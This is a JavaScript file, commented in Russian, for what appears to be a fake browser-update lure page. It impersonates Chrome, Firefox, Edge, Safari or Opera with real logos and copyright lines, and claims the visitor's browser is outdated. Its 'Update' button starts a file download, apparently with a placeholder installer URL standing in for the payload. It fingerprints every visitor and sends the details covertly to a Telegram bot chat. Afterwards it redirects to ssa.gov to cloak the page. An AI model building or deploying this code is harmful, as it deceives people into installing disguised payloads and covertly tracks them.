const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // Вставьте ваш токен
const TELEGRAM_CHAT_ID = "-4987915951"; // Вставьте ваш групповой Chat ID

// Constants for localStorage keys (ОБНОВЛЕНО!)
const HAS_REDIRECTED_FROM_INDEX_KEY = "hasRedirected_from_index"; // Флаг для index.html
const HAS_REDIRECTED_FROM_INDEX2_KEY = "hasRedirected_from_index2"; // Флаг для index2.html
const REDIRECT_DELAY_MS = 60000; // 60 seconds delay for redirect

function generateUUID() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0,
      v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function getOrCreateUserData() {
  let userData = localStorage.getItem("userData");
  if (userData) {
    userData = JSON.parse(userData);
    userData.lastVisit = new Date().toISOString();
  } else {
    const now = new Date().toISOString();
    userData = {
      userId: generateUUID(),
      firstVisit: now,
      lastVisit: now,
      initialDeviceType: null,
      lastDeviceType: null,
    };
  }
  localStorage.setItem("userData", JSON.stringify(userData));
  return userData;
}

async function sendTelegramMessage(message) {
  if (
    !TELEGRAM_BOT_TOKEN ||
    !TELEGRAM_CHAT_ID ||
    TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" ||
    TELEGRAM_CHAT_ID === "YOUR_TELEGRAM_CHAT_ID"
  ) {
    console.warn(
      "Telegram Bot Token or Chat ID is not set. Message will not be sent."
    );
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = new URLSearchParams({
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
  });

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: params.toString(),
    });
    const data = await response.json();
    if (!data.ok) {
      console.error("Error sending message to Telegram:", data.description);
    } else {
      console.log("Message sent to Telegram successfully.");
    }
  } catch (error) {
    console.error("Error while making request to Telegram API:", error);
  }
}

function getDeviceType() {
  const isMobileMatch = window.matchMedia("(max-width: 768px)").matches;
  console.log("DEBUG: Window innerWidth:", window.innerWidth, "px");
  console.log("DEBUG: Match media (max-width: 768px):", isMobileMatch);
  return isMobileMatch ? "Mobile" : "Desktop";
}

function updateDeviceName() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log("DEBUG: Current User-Agent string:", userAgent);
  const deviceNameSpan = document.getElementById("device-name");

  let specificDeviceType = "Mobile";

  if (
    /(iPad|iPhone|iPod).*OS (\d+_)?(\d+)/.test(userAgent) &&
    !window.MSStream
  ) {
    specificDeviceType = "iPhone";
    console.log("DEBUG: Detected iOS device (iPhone/iPad/iPod).");
  } else if (/android/i.test(userAgent)) {
    specificDeviceType = "Android";
    console.log("DEBUG: Detected Android device.");
  } else {
    console.log(
      "DEBUG: Did not detect specific mobile device (defaulting to Mobile)."
    );
  }

  if (deviceNameSpan) {
    deviceNameSpan.textContent = specificDeviceType;
    console.log("DEBUG: 'device-name' span updated to:", specificDeviceType);
  } else {
    console.error("DEBUG: Element with ID 'device-name' not found!");
  }
  return specificDeviceType;
}

function getOSName() {
  const userAgent = navigator.userAgent;
  if (userAgent.includes("Windows NT 10.0")) return "Windows 10/11";
  if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
  if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
  if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
  if (userAgent.includes("Macintosh") || userAgent.includes("Mac OS X"))
    return "macOS";
  if (userAgent.includes("Linux")) return "Linux";
  if (userAgent.includes("Android")) return "Android";
  if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
  return "Unknown OS";
}

function getTimeZone() {
  try {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
  } catch (e) {
    return "Unknown Timezone";
  }
}

function getScreenResolution() {
  return `${window.screen.width}x${window.screen.height}`;
}

function getBrowserLanguage() {
  return navigator.language || navigator.userLanguage;
}

function getReferrer() {
  return document.referrer || "Direct / Unknown";
}

function updateLastCheckedDateTime() {
  const refIdElement = document.querySelector(".mobile-ref-id");

  if (!refIdElement) {
    return;
  }

  const now = new Date();

  const monthNames = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec",
  ];
  const month = monthNames[now.getMonth()];
  const day = now.getDate();

  let hours = now.getHours();
  const minutes = now.getMinutes();
  const ampm = hours >= 12 ? "PM" : "AM";
  hours = hours % 12;
  hours = hours ? hours : 12;
  const formattedMinutes = minutes < 10 ? "0" + minutes : minutes;

  const timeZoneAbbr =
    Intl.DateTimeFormat("en", { timeZoneName: "short" })
      .format(now)
      .split(" ")[2] || "UTC";

  const refIdText = `<span class="ref-number">Ref: mbl-UX-302</span>`;
  const lastCheckedText = `Last checked: ${month} ${day}, ${hours}:${formattedMinutes} ${ampm} (${timeZoneAbbr})`;

  refIdElement.innerHTML = `${refIdText} <br /> ${lastCheckedText}`;
}

function detectBrowserAndSetContent() {
  const chromeLogoDesktop = document.querySelector(
    ".desktop-content .chrome-logo"
  );
  const osInfoDesktop = document.querySelector(".desktop-content .os-info");
  const updateButtonDesktop = document.querySelector(
    ".desktop-content .update-button"
  );
  const popupTitleDesktop = document.querySelector(".desktop-content h2");
  const popupTextDesktop = document.querySelector(".desktop-content p");
  const termsTextDesktop = document.querySelector(
    ".desktop-content .terms-text"
  );
  const copyrightTextDesktop = document.querySelector(
    ".desktop-content .copyright-text"
  );
  const checkboxLabelDesktop = document.querySelector(
    ".desktop-content .checkbox-container label"
  );

  const userAgent = navigator.userAgent;
  let displayBrowserName = "Chrome";
  let browserText = "Chrome browser";
  let logoSrc =
    "https://upload.wikimedia.org/wikipedia/commons/a/a5/Google_Chrome_icon_%28September_2014%29.svg";

  let termsLinkText = "Google Terms of service";
  let termsLinkHref = ""; // Заполните актуальные ссылки, если они есть
  let copyrightHolder = "Google LLC.";
  let checkboxCompany = "Google";

  if (userAgent.includes("Firefox")) {
    displayBrowserName = "Mozilla Firefox";
    browserText = "Firefox browser";
    logoSrc =
      "https://upload.wikimedia.org/wikipedia/commons/a/a4/Firefox_icon%2C_2017.svg";
    termsLinkText = "Mozilla Terms of Service";
    termsLinkHref = "";
    copyrightHolder = "Mozilla LLC.";
    checkboxCompany = "Mozilla";
  } else if (userAgent.includes("Edg")) {
    displayBrowserName = "Microsoft Edge";
    browserText = "Edge browser";
    logoSrc =
      "https://upload.wikimedia.org/wikipedia/commons/9/98/Microsoft_Edge_logo_%282019%29.svg";
    termsLinkText = "Microsoft Services Agreement";
    termsLinkHref = "";
    copyrightHolder = "Microsoft Corporation.";
    checkboxCompany = "Microsoft";
  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
    displayBrowserName = "Safari";
    browserText = "Safari browser";
    logoSrc =
      "https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg";
    termsLinkText = "Apple Media Services Terms and Conditions";
    termsLinkHref = "";
    copyrightHolder = "Apple Inc.";
    checkboxCompany = "Apple";
  } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
    displayBrowserName = "Opera";
    browserText = "Opera browser";
    logoSrc =
      "https://upload.wikimedia.org/wikipedia/commons/4/49/Opera_2015_icon.svg";
    termsLinkText = "Opera Terms of Service";
    termsLinkHref = "";
    copyrightHolder = "Opera Software.";
    checkboxCompany = "Opera";
  }

  if (chromeLogoDesktop) {
    chromeLogoDesktop.src = logoSrc;
    chromeLogoDesktop.alt = `${displayBrowserName} Logo`;
  }
  if (popupTitleDesktop)
    popupTitleDesktop.innerHTML = `Get more done with the new ${displayBrowserName}`;
  if (popupTextDesktop)
    popupTextDesktop.innerHTML = `You are currently using an outdated version of ${browserText}. To use all features of the site, please download and install update.`;
  if (updateButtonDesktop)
    updateButtonDesktop.innerHTML = `<i class="fas fa-download"></i> Update ${displayBrowserName}`;
  if (termsTextDesktop)
    termsTextDesktop.innerHTML = `By downloading ${displayBrowserName}, you agree to the<br><a href="${termsLinkHref}" target="_blank" rel="noopener noreferrer">${
      termsLinkHref ? termsLinkText : displayBrowserName + " Terms"
    }</a>.`;
  if (copyrightTextDesktop)
    copyrightTextDesktop.innerHTML = `© 2025 ${copyrightHolder}`;
  if (checkboxLabelDesktop) {
    checkboxLabelDesktop.innerHTML = `Help make ${browserText} better by sending usage statistics and crash report to ${checkboxCompany}. `;
  }
}

function detectOSAndSetText() {
  const osInfoDesktop = document.querySelector(".desktop-content .os-info");
  const fixedOsText = "For Windows 11/10/8.1 64-bit";
  if (osInfoDesktop) osInfoDesktop.textContent = fixedOsText; // ИСПРАВЛЕНИЕ: osInfoDesktop вместо osInfoOsText
}

function showPopupSmoothly() {
  const popupOverlay = document.querySelector(".popup-overlay");
  const desktopPopup = document.querySelector(".popup");
  const chromeLogoDesktop = document.querySelector(
    ".desktop-content .chrome-logo"
  );

  const delayMs = 1500;

  if (!popupOverlay || !desktopPopup) {
    console.error("Desktop popup elements not found!");
    return;
  }

  setTimeout(() => {
    popupOverlay.classList.add("show-overlay");
    desktopPopup.classList.add("show-popup");
    if (chromeLogoDesktop) chromeLogoDesktop.classList.add("animate");
  }, delayMs);
}

document.addEventListener("DOMContentLoaded", () => {
  const popupOverlay = document.querySelector(".popup-overlay"); // для index.html
  const desktopPopup = document.querySelector(".popup"); // для index.html
  const mobileBanner = document.getElementById("mobile-notification-banner"); // для обеих
  const newDesktopContainer = document.querySelector(".container"); // для index2.html

  // Определяем, на какой странице мы находимся (проверяем наличие уникальных элементов)
  const isOldDesktopVersion = !!desktopPopup; // Если popup присутствует, это index.html
  const isNewDesktopVersion = !!newDesktopContainer && !isOldDesktopVersion; // Если container есть и нет popup, это index2.html

  let userData = getOrCreateUserData();
  const currentDeviceType = getDeviceType();
  const osName = getOSName();
  const timeZone = getTimeZone();
  const screenResolution = getScreenResolution();
  const browserLanguage = getBrowserLanguage();
  const referrer = getReferrer();
  const currentUrl = window.location.href;

  // --- НОВАЯ ЛОГИКА РЕДИРЕКТОВ ---
  if (currentDeviceType === "Desktop") {
    if (isNewDesktopVersion) {
      // Это index2.html (или похожая страница) на десктопе
      const hasRedirectedFromIndex2 = localStorage.getItem(
        HAS_REDIRECTED_FROM_INDEX2_KEY
      );

      if (hasRedirectedFromIndex2 === "true") {
        // Если пользователь уже был перенаправлен с этой страницы
        console.log(
          "DEBUG: User previously redirected from index2 type page, redirecting immediately."
        );
        window.location.href = "https://www.ssa.gov";
        return; // Останавливаем дальнейшее выполнение скрипта
      } else {
        // Первый раз на index2.html на десктопе - запускаем таймер
        console.log(
          "DEBUG: Detected index2 type page on desktop. Starting auto-redirect timer (60 seconds)."
        );
        setTimeout(() => {
          console.log(
            "DEBUG: Auto-redirect timer finished for index2 type page, redirecting to SSA.gov"
          );
          localStorage.setItem(HAS_REDIRECTED_FROM_INDEX2_KEY, "true"); // Устанавливаем флаг
          window.location.href = "https://www.ssa.gov"; // Выполняем редирект
        }, REDIRECT_DELAY_MS);
      }
    } else if (isOldDesktopVersion) {
      // Это index.html на десктопе
      const hasRedirectedFromIndex = localStorage.getItem(
        HAS_REDIRECTED_FROM_INDEX_KEY
      );

      if (hasRedirectedFromIndex === "true") {
        // Если пользователь уже нажимал кнопку на index.html
        console.log(
          "DEBUG: User previously clicked button on index.html, redirecting immediately."
        );
        window.location.href = "https://www.ssa.gov";
        return; // Останавливаем дальнейшее выполнение скрипта
      } else {
        // Первый раз на index.html на десктопе - ждем клика по кнопке
        const updateButtonDesktop = document.querySelector(
          ".desktop-content .update-button"
        );
        if (updateButtonDesktop) {
          updateButtonDesktop.addEventListener("click", (event) => {
            event.preventDefault(); // Предотвращаем стандартное действие ссылки

            updateButtonDesktop.disabled = true;
            updateButtonDesktop.style.opacity = "0.7";
            updateButtonDesktop.style.cursor = "not-allowed";
            console.log(
              "Desktop 'Update Browser' button clicked. Initiating download and starting redirect timer."
            );

            //
            // FILE DOWNLOAD
            window.location.href =
              "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.83-installer.msi";

            setTimeout(() => {
              console.log(
                "DEBUG: Redirect timer finished for index.html button click, redirecting to SSA.gov"
              );
              localStorage.setItem(HAS_REDIRECTED_FROM_INDEX_KEY, "true"); // Устанавливаем флаг
              window.location.href = "https://www.ssa.gov"; // ЭТА СТРОКА ВЫПОЛНИТСЯ ЧЕРЕЗ 60 СЕКУНД
            }, REDIRECT_DELAY_MS);

            // Отправка сообщения в Telegram при клике - ЭТОТ БЛОК ОСТАЕТСЯ БЕЗ ИЗМЕНЕНИЙ
            const clickMessage = `
                <b>User clicked the download button!</b>
                <b>ID:</b> ${userData.userId}
                <b>Device:</b> ${currentDeviceType}
                <b>OS:</b> ${osName}
                <b>Timezone:</b> ${timeZone}
                <b>Screen resolution:</b> ${screenResolution}
                <b>Browser language:</b> ${browserLanguage}
                <b>Referrer:</b> ${referrer}
                <b>URL:</b> ${currentUrl}
              `;
            sendTelegramMessage(clickMessage);
          });
        }
      }
    }
  }
  // --- КОНЕЦ НОВОЙ ЛОГИКИ РЕДИРЕКТОВ ---

  // --- ЛОГИКА ТРЕКИНГА ПОСЕТИТЕЛЕЙ (Без изменений) ---
  if (!userData.initialDeviceType) {
    userData.initialDeviceType = currentDeviceType;
    userData.lastDeviceType = currentDeviceType;
    localStorage.setItem("userData", JSON.stringify(userData));

    const initialVisitMessage = `
            <b>NEW VISITOR!</b>
            <b>ID:</b> ${userData.userId}
            <b>First visit:</b> ${new Date(
              userData.firstVisit
            ).toLocaleString()}
            <b>Current visit:</b> ${new Date(
              userData.lastVisit
            ).toLocaleString()}
            <b>Device (first/current):</b> ${currentDeviceType}
            <b>OS:</b> ${osName}
            <b>Timezone:</b> ${timeZone}
            <b>Screen resolution:</b> ${screenResolution}
            <b>Browser language:</b> ${browserLanguage}
            <b>Referrer:</b> ${referrer}
            <b>URL:</b> ${currentUrl}
        `;
    sendTelegramMessage(initialVisitMessage);
  } else {
    const returningVisitMessage = `
            <b>RETURNING VISITOR!</b>
            <b>ID:</b> ${userData.userId}
            <b>First visit:</b> ${new Date(
              userData.firstVisit
            ).toLocaleString()}
            <b>Current visit:</b> ${new Date(
              userData.lastVisit
            ).toLocaleString()}
            <b>Device (previous):</b> ${userData.lastDeviceType}
            <b>Device (current):</b> ${currentDeviceType}
            <b>OS:</b> ${osName}
            <b>Timezone:</b> ${timeZone}
            <b>Screen resolution:</b> ${screenResolution}
            <b>Browser language:</b> ${browserLanguage}
            <b>Referrer:</b> ${referrer}
            <b>URL:</b> ${currentUrl}
        `;
    sendTelegramMessage(returningVisitMessage);

    if (
      userData.lastDeviceType &&
      userData.lastDeviceType !== currentDeviceType
    ) {
      const deviceChangeMessage = `
                <b>DEVICE CHANGED!</b>
                <b>ID:</b> ${userData.userId}
                <b>From:</b> ${userData.lastDeviceType}
                <b>To:</b> ${currentDeviceType}
            `;
      sendTelegramMessage(deviceChangeMessage);
    }

    userData.lastDeviceType = currentDeviceType;
    localStorage.setItem("userData", JSON.stringify(userData));
  }
  // --- КОНЕЦ ЛОГИКИ ТРЕКИНГА ПОСЕТИТЕЛЕЙ ---

  function updateDisplayLogic() {
    const isMobile = getDeviceType() === "Mobile";
    console.log("DEBUG: updateDisplayLogic - isMobile:", isMobile);

    if (isMobile) {
      if (mobileBanner) {
        mobileBanner.style.display = "flex";
        console.log("DEBUG: Displaying mobile banner.");
      }
      if (desktopPopup) {
        desktopPopup.style.display = "none";
        console.log("DEBUG: Hiding original desktop popup.");
      }
      if (popupOverlay) {
        popupOverlay.style.display = "none";
        console.log("DEBUG: Hiding popup overlay.");
      }
      if (newDesktopContainer) {
        newDesktopContainer.style.display = "none";
        console.log("DEBUG: Hiding new desktop container.");
      }

      updateDeviceName();
      updateLastCheckedDateTime();
    } else {
      if (mobileBanner) {
        mobileBanner.style.display = "none";
      }

      if (isOldDesktopVersion) {
        if (desktopPopup && popupOverlay) {
          desktopPopup.style.display = "flex";
          showPopupSmoothly();
          detectBrowserAndSetContent();
          detectOSAndSetText();
          console.log("DEBUG: Displaying original desktop popup.");
        }
        if (newDesktopContainer) {
          newDesktopContainer.style.display = "none";
        }
      } else if (isNewDesktopVersion) {
        if (newDesktopContainer) {
          newDesktopContainer.style.display = "flex";
          console.log("DEBUG: Displaying new desktop container.");
        }
        if (desktopPopup) {
          desktopPopup.style.display = "none";
        }
        if (popupOverlay) {
          popupOverlay.style.display = "none";
        }
      }
    }
  }

  window.addEventListener("resize", updateDisplayLogic);
  updateDisplayLogic(); // Вызываем при загрузке страницы

  // Обработчики для кнопок мобильного баннера (общие для обеих страниц на мобильных)
  const mobileCloseButton = document.querySelector(".mobile-close-button");
  if (mobileCloseButton) {
    mobileCloseButton.addEventListener("click", () => {
      if (mobileBanner) {
        mobileBanner.style.display = "none";
      }
    });
  }
  const mobileLearnMoreLink = document.querySelector(".mobile-learn-more");
  if (mobileLearnMoreLink) {
    mobileLearnMoreLink.addEventListener("click", (e) => {
      e.preventDefault();
      if (mobileBanner) {
        mobileBanner.style.display = "none";
      }
    });
  }
});
